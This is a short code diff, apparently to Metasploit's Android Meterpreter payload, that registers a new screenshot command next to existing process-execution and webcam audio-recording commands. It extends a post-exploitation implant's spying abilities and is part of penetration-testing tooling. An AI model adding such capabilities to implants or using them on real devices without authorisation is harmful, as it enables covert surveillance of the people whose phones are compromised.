@@ -6,6 +6,7 @@ import android.os.Looper;
 
 import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.android.*;
+import com.metasploit.meterpreter.android.stdapi_ui_desktop_screenshot;
 import com.metasploit.meterpreter.stdapi.*;
 
 import java.io.DataInputStream;
@@ -127,6 +128,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_sys_config_localtime", stdapi_sys_config_localtime.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
+        mgr.registerCommand("stdapi_ui_desktop_screenshot", stdapi_ui_desktop_screenshot.class);
         if (context != null) {
             mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
             mgr.registerCommand("webcam_list", webcam_list_android.class);
